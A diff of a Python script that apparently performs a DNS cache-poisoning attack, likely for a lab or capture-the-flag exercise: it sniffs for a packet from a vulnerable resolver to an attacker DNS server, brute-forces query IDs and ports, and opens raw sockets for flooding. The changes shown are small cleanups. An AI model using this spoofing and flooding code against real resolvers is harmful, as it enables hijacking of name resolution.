@@ -52,6 +52,7 @@ def secret_job():
         :return:
         '''
         global GOAL
+
         scrt_pkt = sniff(count=1, filter= "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 1337")
         GOAL = 1
         scrt_pkt[0].show()
@@ -61,7 +62,6 @@ def master_job():
         MAIN
         :return:
         '''
-
         global GOAL
         global Q_ID
         global PORT_NUMBER
@@ -82,7 +82,7 @@ def master_job():
                         sniffer_thread.join()
                         continue
 
-                print ('\n\n\nTry # ' + str(N_TRY) +'\n[FOUND]\tqID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))
+                print ('\n\n\nTry # ' + str(N_TRY) + '\n[FOUND]\tqID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))
 
 
                 # TODO N.B: sul mio pc il DNS impiega 1 ms per un dig, in 1 ms l'host riesce a mandare circa 150 pacchetti
@@ -114,10 +114,12 @@ def master_job():
         print "Goal reached.\nEND"
 
 
-
 ############################ MAIN ###########################
 # init socket
 flood_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 query_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
 master_job()
+
+flood_sock.close()
+query_sock.close()
